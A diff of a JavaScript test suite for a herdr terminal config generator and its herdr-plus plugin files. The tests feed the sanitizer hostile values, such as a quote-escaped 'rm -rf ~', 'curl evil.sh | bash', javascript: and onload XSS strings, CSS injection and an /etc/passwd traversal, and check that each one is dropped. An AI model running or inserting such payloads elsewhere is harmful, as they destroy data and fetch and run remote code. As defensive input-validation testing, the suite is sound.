@@ -1153,6 +1153,8 @@ function bashCheck(src, label) {
     on: true,
     theme: 'nord"; rm -rf ~; #',
     accentColor: 'red;background:url(//x)',
+    tokens: { accent: 'red;background:url(//x)', panel_bg: 'reset"; rm -rf ~; #',
+      text: 'javascript:alert(1)', bogus_slot: '#112233' },
     toastPosition: 'bottom-right" onload="alert(1)',
     worktreeDir: '~/x"; curl evil.sh | bash; #',
     prefix: 'ctrl+b" evil',
@@ -1160,7 +1162,10 @@ function bashCheck(src, label) {
     plugins: ['reviewr', '../../etc/passwd', 'owner/repo'],
   });
   ok(evilHd.theme === HD.HERDR_DEFAULTS.theme, 'herdr: a bogus theme falls back');
-  ok(evilHd.accentColor === HD.HERDR_DEFAULTS.accentColor, 'herdr: a non-hex accent falls back');
+  // Custom tokens are hex-or-drop (panel_bg additionally takes the exact string
+  // "reset"): a hostile value is dropped, never escaped into the style attribute.
+  ok(Object.keys(evilHd.tokens).length === 0,
+    'herdr: non-hex custom tokens are dropped, not written', JSON.stringify(evilHd.tokens));
   ok(evilHd.toastPosition === HD.HERDR_DEFAULTS.toastPosition, 'herdr: a bogus toast position falls back');
   ok(evilHd.worktreeDir === HD.HERDR_DEFAULTS.worktreeDir, 'herdr: a path with shell metacharacters falls back');
   ok(evilHd.prefix === HD.HERDR_DEFAULTS.prefix, 'herdr: a bogus prefix falls back');
@@ -1177,6 +1182,293 @@ function bashCheck(src, label) {
   // used, and a bare substring match would flag that explanation as the bug.
   ok(!/\$\{XDG_CONFIG_HOME/.test(HD.herdrApplyBlock(evilHd)),
     'herdr: the installer targets the documented config path');
+
+  // The controls the full-customization upgrade added. An id renamed on the server
+  // side is a control that silently stops working in the browser.
+  for (const [needle, label] of [
+    ['id="tokGrid"', 'the 16-token [theme.custom] grid'],
+    ['paintTokens', 'the token grid renderer'],
+    ['id="t_autoSwitch"', 'the auto_switch toggle'],
+    ['id="t_lightName"', 'the light-variant pick'],
+    ['id="t_darkName"', 'the dark-variant pick'],
+    ['binary-verified', 'the binary-verified badge on the light variants'],
+    ['id="hp_install"', 'the herdr-plus install toggle'],
+    ['id="hpProjects"', 'the projects builder'],
+    ['id="hpActions"', 'the quick-actions builder'],
+    ['id="hpTrees"', 'the worktree-layouts builder'],
+    ['id="plusFiles"', 'the herdr-plus files box'],
+    ['paintPlus', 'the herdr-plus renderer'],
+    ['Save this setup', 'the save card'],
+    ["act('update'", 'the saved-setup update action'],
+    ["act('rename'", 'the saved-setup rename action'],
+  ]) ok(hdPage.includes(needle), '/herdr: has ' + label);
+  ok(HD.BIN_VERIFIED_THEMES.every(t => HD.HERDR_THEMES.includes(t)),
+    'herdr: every binary-verified light variant is actually offerable');
+
+  // ── [theme.custom]: all 16 slots, emit-only-what-was-set ────────────────────
+  const hdTok = HD.sanitizeHerdr({ on: true, tokens: { accent: '#FF2200', panel_bg: 'reset', mauve: '#A0A0FF' } });
+  ok(hdTok.tokens.accent === '#ff2200' && hdTok.tokens.panel_bg === 'reset' && hdTok.tokens.mauve === '#a0a0ff',
+    'herdr: hex tokens normalize to lowercase; panel_bg accepts "reset"');
+  const tokToml = HD.buildHerdrConfigToml(hdTok);
+  ok(/\[theme\.custom\]/.test(tokToml) && /^panel_bg = "reset"$/m.test(tokToml)
+    && /^mauve = "#a0a0ff"$/m.test(tokToml),
+    'herdr: set tokens land in [theme.custom]');
+  ok((tokToml.match(/^accent = "#ff2200"$/gm) || []).length === 2,
+    'herdr: the accent token also sets ui.accent so the whole UI follows');
+  const noTok = HD.buildHerdrConfigToml(HD.sanitizeHerdr({ on: true }));
+  ok(!noTok.includes('[theme.custom]') && !/^accent = /m.test(noTok),
+    'herdr: with no tokens set, [theme.custom] and ui.accent are omitted entirely');
+  ok(HD.sanitizeHerdr({ on: true, customAccent: true, accentColor: '#AABBCC' }).tokens.accent === '#aabbcc',
+    'herdr: a legacy customAccent link folds into the accent token');
+
+  // ── theme.auto_switch + light_name/dark_name emit rules ─────────────────────
+  const hdAuto = HD.buildHerdrConfigToml(HD.sanitizeHerdr(
+    { on: true, autoSwitch: true, lightName: 'one-light', darkName: 'vesper' }));
+  ok(/^auto_switch = true$/m.test(hdAuto) && /^light_name = "one-light"$/m.test(hdAuto)
+    && /^dark_name = "vesper"$/m.test(hdAuto),
+    'herdr: auto_switch writes the chosen light/dark names');
+  const hdAutoUnset = HD.buildHerdrConfigToml(HD.sanitizeHerdr({ on: true, autoSwitch: true }));
+  ok(/^auto_switch = true$/m.test(hdAutoUnset) && !/light_name|dark_name/.test(hdAutoUnset),
+    'herdr: unset variant names are omitted so herdr picks its own sibling');
+  ok(!/auto_switch|light_name|dark_name/.test(HD.buildHerdrConfigToml(
+    HD.sanitizeHerdr({ on: true, autoSwitch: false, lightName: 'one-light', darkName: 'vesper' }))),
+    'herdr: variant names are only written while auto_switch is on');
+
+  // ── the real 0.8.0 keys the page grew ───────────────────────────────────────
+  const hdKeys = HD.buildHerdrConfigToml(HD.sanitizeHerdr({ on: true,
+    defaultShell: '/opt/homebrew/bin/fish -l', versionCheck: false, manifestCheck: false,
+    sidebarMinWidth: 12, sidebarMaxWidth: 50, mobileWidthThreshold: 90,
+    promptNewTabName: false, promptNewWorkspaceName: true,
+    clipToastEnabled: false, clipToastPosition: 'top-center',
+    soundAgents: { droid: 'on', codex: 'off', bogus: 'on', gemini: 'maybe' } }));
+  for (const line of ['default_shell = "/opt/homebrew/bin/fish -l"', 'sidebar_min_width = 12',
+    'sidebar_max_width = 50', 'mobile_width_threshold = 90', 'prompt_new_tab_name = false',
+    'prompt_new_workspace_name = true', 'version_check = false', 'manifest_check = false']) {
+    ok(hdKeys.includes('\n' + line + '\n'), 'herdr 0.8.0 key lands: ' + line);
+  }
+  ok(/\[ui\.toast\.clipboard\]\nenabled = false\nposition = "top-center"/.test(hdKeys),
+    'herdr: the clipboard-toast keys land under [ui.toast.clipboard]');
+  ok(/^codex = "off"$/m.test(hdKeys) && /^droid = "on"$/m.test(hdKeys)
+    && !/bogus|maybe/.test(hdKeys),
+    'herdr: per-agent sound overrides land; unknown agents and modes are dropped');
+  ok(!/default_shell/.test(noTok),
+    'herdr: an unset default_shell is omitted, not pinned to ""');
+  const hdBand = HD.sanitizeHerdr({ on: true, sidebarMinWidth: 30, sidebarMaxWidth: 21, sidebarWidth: 36 });
+  ok(hdBand.sidebarMaxWidth >= hdBand.sidebarMinWidth
+    && hdBand.sidebarWidth >= hdBand.sidebarMinWidth && hdBand.sidebarWidth <= hdBand.sidebarMaxWidth,
+    'herdr: sidebar min/max/width stay a coherent band');
+
+  // ── herdr-plus: the docs’ schema rules, enforced in the builder ─────────
+  const hdPlus = HD.sanitizeHerdr({ on: true, plus: {
+    install: true,
+    projects: [
+      { name: 'My App', description: 'main app', group: 'work', workingDir: '~/code/app',
+        tabs: [
+          { name: 'editor', command: 'nvim .',
+            panes: [{ command: 'nvim .', split: 'right' }, { command: 'npm run dev' },
+              { command: '', split: 'down' }, { command: 'x' }, { command: 'overflow' }] },
+          { name: 'shell', command: 'echo "hi \\ there"' },
+          { command: 'nameless tab, never reaches the file' },
+        ] },
+      { name: 'My App', tabs: [{ name: 'main' }] },
+      { name: '', tabs: [{ name: 'main' }] },
+    ],
+    quickActions: [
+      { name: 'Deploy', type: 'select', command: 'deploy {{.Value}}',
+        options: [
+          { heading: 'Environments' },
+          { label: 'staging', value: 'stg', description: 'safe' },
+          {},
+          { label: 'production', value: 'prod' },
+        ] },
+      { name: 'No options', type: 'select', command: 'x', options: [{ heading: 'only-a-heading' }] },
+      { name: 'Ask', type: 'form', command: 'git switch {{.Value}}', form: { prompt: 'Branch?', placeholder: 'main' } },
+      { name: '', type: 'command', command: 'nameless' },
+    ],
+    worktrees: [
+      { repo: 'shayan-cc-config', branch: 'main', tabs: [{ name: 'agent', command: 'echo go' }] },
+      { repo: '', tabs: [{ name: 'x' }] },
+    ],
+  } });
+  ok(hdPlus.plus.projects[0].tabs[0].command === '' && hdPlus.plus.projects[0].tabs[0].panes.length === 4,
+    'herdr-plus: a tab with panes drops its command and caps at 4 panes (docs: load errors)');
+  const plusFiles = HD.buildHerdrPlusFiles(hdPlus);
+  const plusRels = plusFiles.map(f => f.rel);
+  ok(plusRels.includes('projects/scc-my-app.toml') && plusRels.includes('projects/scc-my-app-2.toml'),
+    'herdr-plus: colliding slugs are deduped, never overwriting a sibling', plusRels.join(' '));
+  ok(plusRels.length === 5,
+    'herdr-plus: incomplete entries never reach a file (5 of 9 survive)', plusRels.join(' '));
+  const hpP1 = plusFiles.find(f => f.rel === 'projects/scc-my-app.toml').body;
+  ok((hpP1.match(/\[\[tabs\]\]/g) || []).length === 2, 'herdr-plus: the nameless tab is left out');
+  ok((hpP1.match(/\[\[tabs\.panes\]\]/g) || []).length === 4, 'herdr-plus: exactly the 4 capped panes are written');
+  ok(hpP1.includes('command = "echo \\"hi \\\\ there\\""'),
+    'herdr-plus: quotes and backslashes are TOML-escaped on emit');
+  ok(/^working_dir = "~\/code\/app"$/m.test(hpP1) && /^group = "work"$/m.test(hpP1),
+    'herdr-plus: working_dir and group land');
+  const hpQa = plusFiles.find(f => f.rel === 'quick-actions/scc-deploy.toml').body;
+  ok(/^type = "select"$/m.test(hpQa) && hpQa.includes('command = "deploy {{.Value}}"'),
+    'herdr-plus: a select quick action keeps its template command');
+  ok((hpQa.match(/\[\[options\]\]/g) || []).length === 4
+    && /\[\[options\]\]\nheading = "Environments"/.test(hpQa),
+    'herdr-plus: separators are label-less options; a heading titles the group');
+  const hpForm = plusFiles.find(f => f.rel === 'quick-actions/scc-ask.toml').body;
+  ok(/\[form\]\nprompt = "Branch\?"\nplaceholder = "main"/.test(hpForm),
+    'herdr-plus: the form prompt and placeholder land');
+  const hpWt = plusFiles.find(f => f.rel === 'worktrees/scc-shayan-cc-config-main.toml').body;
+  ok(/^repo = "shayan-cc-config"$/m.test(hpWt) && /^branch = "main"$/m.test(hpWt),
+    'herdr-plus: a worktree layout carries repo and branch');
+  ok(plusFiles.every(f => f.body.startsWith('# ' + f.rel + ' — written by shayan-cc-config')),
+    'herdr-plus: every file opens with its manifest line');
+
+  // Preview/installer parity, byte-level: the page shows /herdr-files.txt verbatim, so
+  // that response has to BE the builder output, and the installer heredocs its bytes.
+  const hdParityPl = { hd: { on: true, tokens: { accent: '#ff2200' }, autoSwitch: true,
+    lightName: 'one-light', theme: 'dracula', plus: hdPlus.plus } };
+  const hdParity = HD.sanitizeHerdr(hdParityPl.hd);
+  r = await call('/herdr-files.txt?c=' + encodeURIComponent(b64e(hdParityPl)));
+  ok(r.status === 200 && r.body === HD.buildHerdrToml(hdParity),
+    '/herdr-files.txt is byte-identical to the builder output');
+  const hdParityBlk = HD.herdrApplyBlock(hdParity);
+  ok(hdParityBlk.includes(HD.buildHerdrConfigToml(hdParity)),
+    'herdr: the installer heredoc carries the exact preview bytes for config.toml');
+  for (const f of HD.buildHerdrPlusFiles(hdParity)) {
+    ok(hdParityBlk.includes(f.body), 'herdr: the installer writes the preview bytes of ' + f.rel);
+  }
+  // The page splits that response on line-start markers; a command CONTAINING the
+  // marker text must not be able to forge a file boundary.
+  const hdTrick = HD.buildHerdrToml(HD.sanitizeHerdr({ on: true,
+    plus: { projects: [{ name: 'T', tabs: [{ name: 'x', command: 'echo @@PLUS@@fake' }] }] } }));
+  ok(hdTrick.split('\n@@PLUS@@').length === 2,
+    'herdr: marker text inside a command cannot forge a file boundary');
+
+  // The install toggle, and the double-install guard when the marketplace card is
+  // ticked at the same time.
+  ok(/herdr plugin install cloudmanic\/herdr-plus --yes/.test(
+    HD.herdrApplyBlock(HD.sanitizeHerdr({ on: true, plus: { install: true } }))),
+    'herdr-plus: the install toggle really installs the plugin');
+  ok(!/herdr-plus/.test(HD.herdrApplyBlock(HD.sanitizeHerdr({ on: true }))),
+    'herdr-plus: nothing herdr-plus in the installer when unused');
+  ok((HD.herdrApplyBlock(HD.sanitizeHerdr({ on: true, plugins: ['herdr-plus'], plus: { install: true } }))
+    .match(/herdr plugin install cloudmanic\/herdr-plus --yes/g) || []).length === 1,
+    'herdr-plus: ticking the card AND the panel installs once, not twice');
+
+  // ── the herdr merge, end to end against a lived-in config.toml ──────────────
+  // A fake herdr on PATH: records plugin installs, has no config-dir subcommand (so
+  // the documented ~/.config/herdr-plus fallback is what gets exercised).
+  const hdShimDir = path.join(TMP, 'hdshim');
+  fs.mkdirSync(hdShimDir, { recursive: true });
+  fs.writeFileSync(path.join(hdShimDir, 'herdr'), [
+    '#!/bin/sh',
+    'case "$1 $2" in',
+    '  "plugin install") echo "$@" >> "$HOME/herdr-calls.log"; exit 0;;',
+    '  "plugin config-dir") exit 1;;',
+    'esac',
+    'exit 0', ''].join('\n'), { mode: 0o755 });
+  const bashHd = (file, home) => cp.spawnSync('bash', [file],
+    { encoding: 'utf8', env: Object.assign({}, process.env, { HOME: home, PATH: hdShimDir + ':' + process.env.PATH }) });
+
+  const hdHome = path.join(TMP, 'herdrhome');
+  fs.mkdirSync(path.join(hdHome, '.config', 'herdr'), { recursive: true });
+  const hdCfg = path.join(hdHome, '.config', 'herdr', 'config.toml');
+  fs.writeFileSync(hdCfg, [
+    '# hand-tuned',
+    'onboarding = false', '',
+    '[theme]', 'name = "nord"', '',
+    '[experimental]', 'cjk_wide_chars = true', '',
+    '[remote]', 'host = "mybox"', 'port = 22', '',
+    '[[keys.command]]', 'key = "ctrl+j"', 'run = "echo hi"', ''].join('\n'));
+  const hdSh = path.join(TMP, 'herdr.sh');
+  fs.writeFileSync(hdSh, '#!/bin/bash\nset -euo pipefail\n' + HD.herdrApplyBlock(hdParity) + '\n');
+  ok(cp.spawnSync('bash', ['-n', hdSh], { encoding: 'utf8' }).status === 0,
+    'bash -n: herdr layer with herdr-plus files');
+  // A pre-existing user file in projects/ that must never be touched.
+  fs.mkdirSync(path.join(hdHome, '.config', 'herdr-plus', 'projects'), { recursive: true });
+  const hdUserProj = path.join(hdHome, '.config', 'herdr-plus', 'projects', 'mine.toml');
+  fs.writeFileSync(hdUserProj, 'name = "mine"\n\n[[tabs]]\nname = "main"\n');
+  const hdRun = bashHd(hdSh, hdHome);
+  ok(hdRun.status === 0, 'herdr layer applies cleanly',
+    ((hdRun.stderr || '') + (hdRun.stdout || '')).trim().slice(-200));
+  ok(fs.readdirSync(path.dirname(hdCfg)).some(f => /config[.]toml[.]backup-/.test(f)),
+    'herdr: the old config is backed up first');
+  const hdCheck = cp.spawnSync('python3', ['-c', [
+    'import tomllib,json',
+    `d = tomllib.load(open(${JSON.stringify(hdCfg)}, "rb"))`,
+    'print(json.dumps([d["onboarding"], d["theme"]["name"], d["theme"]["auto_switch"],',
+    '  d["theme"]["light_name"], d["theme"]["custom"]["accent"],',
+    '  d["experimental"]["cjk_wide_chars"], d["experimental"]["pane_history"],',
+    '  d["remote"]["host"], d["remote"]["port"], d["keys"]["command"][0]["key"], d["keys"]["prefix"]]))'].join('\n')],
+    { encoding: 'utf8' });
+  ok(hdCheck.status === 0
+    && hdCheck.stdout.trim() === '[false, "dracula", true, "one-light", "#ff2200", true, false, "mybox", 22, "ctrl+j", "ctrl+b"]',
+    'herdr: managed keys replaced; onboarding, [experimental] extras, [remote] and [[keys.command]] survive',
+    hdCheck.stdout.trim() || (hdCheck.stderr || '').slice(0, 200));
+  // Idempotent: a second run must not change a byte of the merged config.
+  const hdSnap = fs.readFileSync(hdCfg, 'utf8');
+  ok(bashHd(hdSh, hdHome).status === 0 && fs.readFileSync(hdCfg, 'utf8') === hdSnap,
+    'herdr: rerunning changes nothing');
+  // herdr-plus landed: all five files, parseable, and the user file untouched.
+  const hdHpDir = path.join(hdHome, '.config', 'herdr-plus');
+  const hdSccFiles = [];
+  for (const sub of ['projects', 'quick-actions', 'worktrees']) {
+    for (const f of fs.readdirSync(path.join(hdHpDir, sub)).filter(x => x.startsWith('scc-'))) {
+      hdSccFiles.push(path.join(hdHpDir, sub, f));
+    }
+  }
+  ok(hdSccFiles.length === 5, 'herdr-plus: all five generated files land', hdSccFiles.join(' '));
+  ok(fs.readFileSync(hdUserProj, 'utf8') === 'name = "mine"\n\n[[tabs]]\nname = "main"\n',
+    'herdr-plus: the user’s own file in projects/ is untouched');
+  const hdHpParse = cp.spawnSync('python3',
+    ['-c', 'import sys,tomllib\nfor p in sys.argv[1:]:\n tomllib.load(open(p,"rb"))\nprint("ok")', ...hdSccFiles],
+    { encoding: 'utf8' });
+  ok(hdHpParse.status === 0 && hdHpParse.stdout.trim() === 'ok',
+    'herdr-plus: python tomllib parses every generated file', (hdHpParse.stderr || '').slice(0, 160));
+  const hdCalls = fs.readFileSync(path.join(hdHome, 'herdr-calls.log'), 'utf8').trim().split('\n');
+  ok(hdCalls.length === 2 && hdCalls.every(l => l === 'plugin install cloudmanic/herdr-plus --yes'),
+    'herdr-plus: the plugin install ran once per apply and nothing else was installed',
+    JSON.stringify(hdCalls));
+  // install off + entries present: files land, no plugin install runs.
+  const hdApply2 = HD.sanitizeHerdr({ on: true, plus: { install: false,
+    projects: [{ name: 'Solo', tabs: [{ name: 'main', command: 'echo hi' }] }] } });
+  const hdSh2 = path.join(TMP, 'herdr2.sh');
+  fs.writeFileSync(hdSh2, '#!/bin/bash\nset -euo pipefail\n' + HD.herdrApplyBlock(hdApply2) + '\n');
+  const hdHome2 = path.join(TMP, 'herdrhome2');
+  fs.mkdirSync(hdHome2, { recursive: true });
+  ok(bashHd(hdSh2, hdHome2).status === 0 && !fs.existsSync(path.join(hdHome2, 'herdr-calls.log')),
+    'herdr-plus: entries without the install toggle never run a plugin install');
+  ok(fs.existsSync(path.join(hdHome2, '.config', 'herdr-plus', 'projects', 'scc-solo.toml')),
+    'herdr-plus: the file still lands without the install toggle');
+  // A narrower setup sweeps the stale scc-* files — and only those.
+  ok(bashHd(hdSh2, hdHome).status === 0, 'herdr-plus: a narrower setup applies over a wider one');
+  const hdProjLeft = fs.readdirSync(path.join(hdHpDir, 'projects')).sort().join(',');
+  ok(hdProjLeft === 'mine.toml,scc-solo.toml',
+    'herdr-plus: stale scc-*.toml files are swept; the user file stays', hdProjLeft);
+  ok(fs.readdirSync(path.join(hdHpDir, 'quick-actions')).filter(x => /^scc-/.test(x)).length === 0
+    && fs.readdirSync(path.join(hdHpDir, 'worktrees')).filter(x => /^scc-/.test(x)).length === 0,
+    'herdr-plus: entry kinds removed entirely are swept too');
+  // With no entries at all the installer leaves old files alone — exactly what the
+  // page copy promises ("delete the old scc-*.toml files by hand").
+  const hdShOff = path.join(TMP, 'herdr-off.sh');
+  fs.writeFileSync(hdShOff, '#!/bin/bash\nset -euo pipefail\n' + HD.herdrApplyBlock(HD.sanitizeHerdr({ on: true })) + '\n');
+  ok(bashHd(hdShOff, hdHome).status === 0
+    && fs.existsSync(path.join(hdHpDir, 'projects', 'scc-solo.toml')),
+    'herdr-plus: with no entries the installer leaves old scc files alone, as the page says');
+  // An unparseable config.toml aborts without touching anything — config or plus files.
+  const hdBadHome = path.join(TMP, 'herdrbad');
+  fs.mkdirSync(path.join(hdBadHome, '.config', 'herdr'), { recursive: true });
+  fs.writeFileSync(path.join(hdBadHome, '.config', 'herdr', 'config.toml'), '[broken\nname = ');
+  const hdBadRun = bashHd(hdSh, hdBadHome);
+  ok(hdBadRun.status !== 0, 'herdr: an unparseable config.toml aborts rather than guessing',
+    'exit ' + hdBadRun.status);
+  ok(fs.readFileSync(path.join(hdBadHome, '.config', 'herdr', 'config.toml'), 'utf8') === '[broken\nname = ',
+    'herdr: the unparseable file is left byte-identical');
+  ok(!fs.existsSync(path.join(hdBadHome, '.config', 'herdr-plus')),
+    'herdr: no herdr-plus files land when the merge aborts');
+  // A machine with no config at all gets the managed file byte-for-byte.
+  const hdNew = path.join(TMP, 'herdrnew');
+  fs.mkdirSync(hdNew, { recursive: true });
+  ok(bashHd(hdSh, hdNew).status === 0
+    && fs.readFileSync(path.join(hdNew, '.config', 'herdr', 'config.toml'), 'utf8') === HD.buildHerdrConfigToml(hdParity),
+    'herdr: a machine with no config gets the managed file byte-for-byte');
 
   // ── /zellij ───────────────────────────────────────────────────────────────
   const zjPage = (await call('/zellij')).body;
